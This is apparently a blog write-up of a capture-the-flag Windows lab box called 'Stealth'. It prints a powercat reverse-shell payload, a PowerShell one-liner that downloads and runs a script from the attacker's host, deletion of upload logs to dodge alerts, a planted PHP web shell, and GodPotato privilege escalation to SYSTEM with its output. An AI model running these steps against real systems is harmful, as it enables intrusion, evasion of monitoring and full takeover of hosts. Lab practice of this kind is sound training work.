---
title: Stealth 
published: 2023-12-19
description: "An in-detail writeup on the winodws box: Stealth from THM"
tags: ["htb", "box", "medium", "windows", "reverse-shells", "privilege-escalation", "av-evasion", "SeImpersonatePrivilege"]
category: HackTheBox
draft: false
---

![](https://tryhackme-images.s3.amazonaws.com/room-icons/67fb507355a387db7f5bdabae942d361.png)

* Directly go to port `8080` 

* It looks like a script analyser for powershell. Hence, I uploaded a reverse shell script generated using powercat.

```bash
$ powercat -c 10.8.136.133 -p 443 -e cmd -g > payload.ps1
``` 

* And I started listening: 

```bash
$ nc -nvlp 443 
Listening on 0.0.0.0 443
Connection received on 10.10.60.153 49776
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\evader\Documents
``` 

## Privilege Escalation

* I found an encoded message in `C:\Users\evader\Desktop` called `encodedflag` 

```bash
C:\Users\evader\Desktop>type encodedflag
type encodedflag
-----BEGIN CERTIFICATE-----
WW91IGNhbiBnZXQgdGhlIGZsYWcgYnkgdmlzaXRpbmcgdGhlIGxpbmsgaHR0cDov
LzxJUF9PRl9USElTX1BDPjo4MDAwL2FzZGFzZGFkYXNkamFramRuc2Rmc2Rmcy5w
aHA=
-----END CERTIFICATE---- 
``` 

* I decrypted it in base64 

```bash
$ echo WW91IGNhbiBnZXQgdGhlIGZsYWcgYnkgdmlzaXRpbmcgdGhlIGxpbmsgaHR0cDovLzxJUF9PRl9USElTX1BDPjo4MDAwL2FzZGFzZGFkYXNkamFramRuc2Rmc2Rmcy5waHA= | base64 -d
You can get the flag by visiting the link http://<IP_OF_THIS_PC>:8000/asdasdadasdjakjdnsdfsdfs.php 
``` 

* I requested the URL: 

```bash
curl http://10.10.60.153:8000/asdasdadasdjakjdnsdfsdfs.php
Hey, seems like you have uploaded invalid file. Blue team has been alerted. <br> Hint: Maybe removing the logs files for file uploads can help? 
``` 

* Hence, I deleted the `log.txt` on `C:\xampp\htdocs\uploads`, later on when I request the php file it returned the flag

```bash
curl http://10.10.60.153:8000/asdasdadasdjakjdnsdfsdfs.php
Flag: THM{10---snip--USER} <br> 
``` 

* Next, I uploaded a web shell written in php (p0wny-shell) to see if we get in as another user, however, we do not, yet a new privilege has been enabled. 

```bash
evader@HostEvasion:C:\xampp\htdocs# whoami
hostevasion\evader

evader@HostEvasion:C:\xampp\htdocs# whoami /priv 

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State 
============================= ========================================= ======== 
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled 
```  


* Then, I add a reverse shell ps1 script to the server and got back a shell: `powershell -c IEX (New-Object System.Net.Webclient).DownloadString('http://10.8.136.133:9999/shell.ps1')`

* Since, `SeImpersonatePrivilege` is present we can impersonate other accounts including admin using the GodPotato tool 

* Running the `PrivEscCheck.ps1` script we find out that the anti virus does not check `C:\xampp` 

```bash
c:\xampp>.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140730361184256
[*] DispatchTable: 0x140730363501744
[*] UseProtseqFunction: 0x140730362879024
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\89380dd1-0819-490b-b391-8b22023dcb62\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00000c02-06cc-ffff-bc2a-41edb6bb3cf5
[*] DCOM obj OXID: 0xa660d24a97b7b629
[*] DCOM obj OID: 0xdf5875d88c733193
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 524 Token:0x636  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 5040 
``` 

```bash
c:\xampp>.\GodPotato-NET4.exe -cmd "cmd /c type C:\users\Administrator\Desktop\flag.txt"
.\GodPotato-NET4.exe -cmd "cmd /c type C:\users\Administrator\Desktop\flag.txt"
[*] CombaseModule: 0x140730361184256
[*] DispatchTable: 0x140730363501744
[*] UseProtseqFunction: 0x140730362879024
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\2bf1b24f-a9f3-4d26-bc8e-7cbc56aff1a8\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00001802-15fc-ffff-c306-5564718871b5
[*] DCOM obj OXID: 0x82dab9687613b6a4
[*] DCOM obj OID: 0x87873019bb181830
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 524 Token:0x636  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 2984
THM{101---snip---CESS} 
``` 

## PWNED! 
